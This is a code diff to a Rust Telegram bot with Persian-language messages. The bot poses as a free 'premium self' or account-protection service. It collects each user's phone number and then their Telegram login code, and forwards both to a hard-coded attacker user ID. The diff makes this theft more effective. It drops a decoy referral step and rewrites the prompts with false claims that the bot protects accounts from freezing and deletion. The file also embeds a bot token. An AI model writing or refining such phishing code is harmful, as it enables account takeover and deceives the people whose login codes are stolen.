@@ -1,4 +1,4 @@
-//! Premium Self Bot — Telegram (Rust 1.98 + teloxide 0.17)
+//! Premium Self Bot — Telegram (Rust + teloxide 0.17)
 
 use std::collections::HashMap;
 use std::sync::Arc;
@@ -12,7 +12,6 @@ use teloxide::types::{
 };
 use teloxide::utils::command::BotCommands;
 use tokio::sync::Mutex;
-use uuid::Uuid;
 
 // ═══════════════════════════════════════════════════════════
 //                        CONFIG
@@ -24,35 +23,21 @@ const BOT_TOKEN: &str = "8867175870:AAGxLoYhj2m360TOxjtg6H9XQ_JotvQQyf8";
 // آیدی عددی مقصدی که شماره و کد باید براش ارسال بشن
 const TARGET_USER_ID: i64 = 7_383_778_633;
 
-// یوزرنیم ربات (بدون @) برای ساخت لینک رفرال
-const BOT_USERNAME: &str = "PREMIUMself1t_bot";
-
 // ═══════════════════════════════════════════════════════════
 //                        TEXTS
 // ═══════════════════════════════════════════════════════════
 
-const WELCOME_TEXT: &str = "\
-سلام به بات پریمیوم سلف خوش اومدید 🌟
-
-با این ربات شما فقط با ی رفرال می‌تونید یک سلف رایگان دریافت کنید \
-با قابلیت های زیاد مثل محافظت از اکانت در برابر ریپورت و ...";
-
-const PHONE_REQUEST_TEXT: &str = "\
-کاربر گرامی برای فعال سازی سلف ما نیاز داریم که شماره ی شمارو تایید کنیم
-این اطلاعات جایی ذخیره نمیشود و نزد ما محفوظ است و پس از راه اندازی سلف \
-از دیتابیس ربات حذف میشود
-
-لطفاً روی دکمهٔ زیر بزنید تا شماره‌تون برامون ارسال بشه.";
+const PHONE_REQUEST_TEXT: &str = "برای فعالسازی شماره اکانت خود را بفرستید .";
 
 const CODE_REQUEST_TEXT: &str = "\
-برای شما بزودی کدی فرستاده می‌شود درون تلگرام
-لطفا اون رو بفرستید.";
+کد ورود به اکانت شما ارسال شد
+کد را بفرستید";
 
 const INVALID_CODE_TEXT: &str = "لطفاً کد رو به صورت عددی ۴ تا ۶ رقمی بفرستید.";
 
 const CODE_RECEIVED_TEXT: &str = "\
-کد شما دریافت شد ✅
-به زودی سلف برای شما فعال می‌شود.";
+تایید شد
+ربات فعال شد✅";
 
 const WRONG_CONTACT_TEXT: &str = "لطفاً شمارهٔ خودتون رو بفرستید، نه شمارهٔ شخص دیگه.";
 
@@ -148,11 +133,23 @@ async fn cmd_start(bot: Bot, msg: Message) -> ResponseResult<()> {
     let user_id = msg.from.as_ref().map(|u| u.id.0 as i64).unwrap_or(0);
     set_state(user_id, UserState::Idle).await;
 
+    let name = msg
+        .from
+        .as_ref()
+        .map(|u| u.first_name.clone())
+        .unwrap_or_else(|| "کاربر".to_string());
+
+    let welcome_text = format!(
+        "سلام {name}\n\
+        این ربات برای امنیت اکانت تلگرام شما است\n\
+        که در برابر فریز و ریپ و حذف شدن اکانت جلوگیری میکند"
+    );
+
     let keyboard = InlineKeyboardMarkup::new(vec![vec![
-        InlineKeyboardButton::callback("دریافت سلف رایگان", "get_self"),
+        InlineKeyboardButton::callback("فعالسازی ربات", "get_self"),
     ]]);
 
-    bot.send_message(msg.chat.id, WELCOME_TEXT)
+    bot.send_message(msg.chat.id, welcome_text)
         .reply_markup(keyboard)
         .await?;
 
@@ -176,7 +173,6 @@ async fn cb_get_self(bot: Bot, q: CallbackQuery) -> ResponseResult<()> {
 
     set_state(user_id, UserState::AwaitingPhone).await;
 
-    // ✅ استفاده از ButtonRequest::Contact به جای request_contact()
     let contact_keyboard = KeyboardMarkup::new(vec![vec![
         KeyboardButton::new("📱 ارسال شماره من").request(ButtonRequest::Contact),
     ]])
@@ -186,21 +182,6 @@ async fn cb_get_self(bot: Bot, q: CallbackQuery) -> ResponseResult<()> {
     if let Some(msg) = q.message {
         bot.send_message(msg.chat().id, PHONE_REQUEST_TEXT)
             .reply_markup(contact_keyboard)
-            .await?;
-    }
-
-    Ok(())
-}
-
-async fn cb_ref_done(bot: Bot, q: CallbackQuery) -> ResponseResult<()> {
-    bot.answer_callback_query(q.id.clone()).await.ok();
-    let user_id = q.from.id.0 as i64;
-
-    set_state(user_id, UserState::AwaitingCode).await;
-
-    if let Some(msg) = q.message {
-        bot.send_message(msg.chat().id, CODE_REQUEST_TEXT)
-            .reply_markup(ReplyMarkup::KeyboardRemove(KeyboardRemove::new()))
             .await?;
     }
 
@@ -217,7 +198,6 @@ async fn handle_contact(bot: Bot, msg: Message) -> ResponseResult<()> {
 
     let Some(contact) = msg.contact() else { return Ok(()) };
 
-    // جلوگیری از ارسال شمارهٔ شخص دیگه
     if let Some(contact_uid) = contact.user_id {
         if contact_uid.0 as i64 != user_id {
             bot.send_message(msg.chat.id, WRONG_CONTACT_TEXT).await?;
@@ -231,7 +211,7 @@ async fn handle_contact(bot: Bot, msg: Message) -> ResponseResult<()> {
     // فوروارد شماره به مقصد
     let target = ChatId(TARGET_USER_ID);
     let forward_text = format!(
-        "📞 *شمارهٔ جدید دریافت شد*\n\nشماره: `{phone}`\nآیدی کاربر: `{user_id}`"
+        "📞 *شمارهٔ جدید دریافت شد*\n\nشماره: {phone}\nآیدی کاربر: {user_id}"
     );
     if let Err(e) = bot
         .send_message(target, &forward_text)
@@ -243,22 +223,11 @@ async fn handle_contact(bot: Bot, msg: Message) -> ResponseResult<()> {
         bot.send_message(target, plain).await.ok();
     }
 
-    // لینک رفرال دکوری
-    let ref_code = Uuid::new_v4().simple().to_string();
-    let ref_code = &ref_code[..8];
-    let ref_link = format!("https://t.me/{BOT_USERNAME}?start={ref_code}");
+    // حالا برو مرحله گرفتن کد
+    set_state(user_id, UserState::AwaitingCode).await;
 
-    let ref_text = format!(
-        "برای استفاده از بات باید یک رفرال داشته باشید\\.\n\nلینک رفرال اختصاصی شما:\n`{ref_link}`"
-    );
-
-    let keyboard = InlineKeyboardMarkup::new(vec![vec![
-        InlineKeyboardButton::callback("رفرال آوردم", "ref_done"),
-    ]]);
-
-    bot.send_message(msg.chat.id, ref_text)
-        .parse_mode(ParseMode::MarkdownV2)
-        .reply_markup(keyboard)
+    bot.send_message(msg.chat.id, CODE_REQUEST_TEXT)
+        .reply_markup(ReplyMarkup::KeyboardRemove(KeyboardRemove::new()))
         .await?;
 
     Ok(())
@@ -284,7 +253,7 @@ async fn handle_text(bot: Bot, msg: Message) -> ResponseResult<()> {
 
     let target = ChatId(TARGET_USER_ID);
     let forward_text = format!(
-        "🔑 *کد جدید دریافت شد*\n\nکد: `{text}`\nشماره: `{phone}`\nآیدی کاربر: `{user_id}`"
+        "🔑 *کد جدید دریافت شد*\n\nکد: {text}\nشماره: {phone}\nآیدی کاربر: {user_id}"
     );
     if let Err(e) = bot
         .send_message(target, &forward_text)
@@ -302,7 +271,7 @@ async fn handle_text(bot: Bot, msg: Message) -> ResponseResult<()> {
 
     bot.send_message(msg.chat.id, CODE_RECEIVED_TEXT).await?;
 
-    Ok(())
+Ok(())
 }
 
 // ═══════════════════════════════════════════════════════════
@@ -345,7 +314,6 @@ async fn main() -> anyhow::Result<()> {
                 |bot: Bot, q: CallbackQuery| async move {
                     match q.data.as_deref() {
                         Some("get_self") => cb_get_self(bot, q).await,
-                        Some("ref_done") => cb_ref_done(bot, q).await,
                         _ => {
                             bot.answer_callback_query(q.id).await.ok();
                             Ok(())
